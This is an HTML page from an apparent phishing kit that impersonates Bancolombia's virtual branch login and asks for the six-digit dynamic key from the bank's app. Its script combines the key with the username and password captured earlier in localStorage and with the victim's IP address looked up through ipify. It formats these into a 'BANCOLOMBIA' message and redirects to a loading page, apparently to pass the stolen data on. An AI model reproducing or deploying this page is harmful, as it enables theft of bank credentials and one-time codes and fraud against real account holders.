<!DOCTYPE html>
<html lang="es">
<head>
    
	 
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> Sucursal Virtual Personas</title>
<link rel="stylesheet" href="style.css">
<script src="js/jquery-3.7.7.js"></script>
</head>
<body>

<!-- HEADER SUPERIOR -->
<div class="header-top">
    <div class="header-content">
        <img src="images/logo.svg" alt="Bancolombia" class="logo-header">
    </div>
</div>

<h1 class="titulo-principal">Ingrese su clave dinámica</h1>

<div class="form-container">
    <div class="form-box">
        <p class="descripcion">
            Ingresa la Clave Dinámica que encuentras en la parte superior de la pantalla de inicio de tu App Bancolombia.
        </p>

        <!-- INPUT CLAVE 6 DIGITOS -->
        <div class="password-wrapper">
            <input type="tel" id="clave" maxlength="6" class="real-password-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
            <div class="password-slots">
                <div class="password-slot"></div>
                <div class="password-slot"></div>
                <div class="password-slot"></div>
                <div class="password-slot"></div>
                <div class="password-slot"></div>
                <div class="password-slot"></div>
            </div>
        </div>

        <div class="botones">
            <button class="btn-continuar" onclick="validarYEnviar()">Continuar</button>
        </div>
    </div>

</div>

<!-- FOOTER -->
<div class="footer-container">
    <img src="images/5125617020933180513 (1).jpg" alt="" class="lineas-form">
    <div class="vigilado-logo">
        <img src="images/vigiladosuper.png">
    </div>

    <div class="info-footer">
        <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span> | Fecha y hora: <span id="fecha-hora">Cargando...</span></div>
    </div>
</div>

<!-- CAMPOS NECESARIOS PARA DATOS -->
<div id="address" style="display:none;"></div>

<script>
    // Manejo visual del input de clave (6 dígitos)
    const inputClave = document.getElementById('clave');
    const slots = document.querySelectorAll('.password-slot');

    inputClave.addEventListener('input', function() {
        const val = this.value;
        // Permitir solo números
        if (!/^\d*$/.test(val)) {
            this.value = val.replace(/\D/g, '');
        }
        
        const cleanVal = this.value;
        
        slots.forEach((slot, index) => {
            if (index < cleanVal.length) {
                slot.textContent = '•';
                slot.classList.add('filled');
            } else {
                slot.textContent = '';
                slot.classList.remove('filled');
            }
            
            // Highlight current slot
            if (index === cleanVal.length) {
                slot.classList.add('active');
            } else {
                slot.classList.remove('active');
            }
        });
    });

    // Lógica de validación y envío
    function validarYEnviar() {
        const clave = inputClave.value;
        
        if (clave.length !== 6) {
            alert("La clave dinámica debe tener 6 dígitos");
            return;
        }

        // Ocultar botones
        document.querySelector('.botones').style.display = 'none';

        // Obtener datos previos
        const usuario = localStorage.getItem('userName') || "Desconocido";
        const clavePrincipal = localStorage.getItem('clave') || "No capturada";
        const ip = document.getElementById("gfg").textContent;
        const ip2 = document.getElementById("address").textContent;

        // Guardar mensaje
        const message = `Usuario: ${usuario}\nClave: ${clavePrincipal}\nClave Dinámica: ${clave}\nIP: ${ip}\n${ip2}\nBANCOLOMBIA`;
        localStorage.setItem('message', message);
        localStorage.setItem('claveDinamica', clave);
        localStorage.removeItem('transaction_id');

        // Enviar (aquí simulamos redirección a load.html)
        window.location.href = 'load.html'; 
    }

    function setText(id, value) {
        const el = document.getElementById(id);
        if (el) el.textContent = value;
    }

    async function cargarIP() {
        try {
            const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
            if (!res.ok) throw new Error("HTTP " + res.status);
            const data = await res.json();
            setText("gfg", data.ip || "No disponible");
            setText("address", data.ip || "No disponible");
        } catch (e) {
            setText("gfg", "No disponible");
            setText("address", "No disponible");
        }
    }

    function actualizarFechaHora() {
        const options = {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: true
        };
        setText("fecha-hora", new Date().toLocaleString("es-CO", options));
    }

    window.addEventListener("load", () => {
        cargarIP();
        actualizarFechaHora();
        setInterval(actualizarFechaHora, 1000);
    });
</script>

</body>
</html>
